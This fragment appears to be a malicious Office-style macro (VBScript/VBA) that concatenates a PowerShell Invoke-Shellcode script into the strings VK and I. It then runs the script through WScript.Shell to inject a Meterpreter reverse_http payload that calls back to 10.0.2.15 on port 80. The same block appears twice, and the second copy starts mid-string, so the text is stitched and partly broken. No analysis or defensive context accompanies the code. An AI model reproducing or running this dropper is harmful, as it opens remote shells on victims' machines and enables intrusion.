        VK = VK + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        VK = VK + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        VK = VK + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        VK = VK + "rocAddress kernel32.dll CreateThread
        $Crea"
        VK = VK + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        VK = VK + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        VK = VK + "IntPtr])
        $CreateThread = [System.Runtime.I"
        VK = VK + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        VK = VK + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        VK = VK + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        VK = VK + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        VK = VK + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        VK = VK + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        VK = VK + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        VK = VK + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        VK = VK + "ForSingleObjectDelegate)
        if ( $Force -or $"
        VK = VK + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        VK = VK + " your evil plans?',
                 "Injecting sh"
        VK = VK + "ellcode into the running PowerShell process!" ) )
"
        VK = VK + "        {
            Inject-LocalShellcode
      "
        VK = VK + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        VK = VK + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        VK = VK + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(VK)
End Function

        $CreateThreadAddr = Get-P"
        I = I + "rocAddress kernel32.dll CreateThread
        $Crea"
        I = I + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        I = I + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        I = I + "IntPtr])
        $CreateThread = [System.Runtime.I"
        I = I + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        I = I + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        I = I + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        I = I + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        I = I + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        I = I + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        I = I + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        I = I + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        I = I + "ForSingleObjectDelegate)
        if ( $Force -or $"
        I = I + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        I = I + " your evil plans?',
                 "Injecting sh"
        I = I + "ellcode into the running PowerShell process!" ) )
"
        I = I + "        {
            Inject-LocalShellcode
      "
        I = I + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        I = I + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        I = I + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(I)
End Function

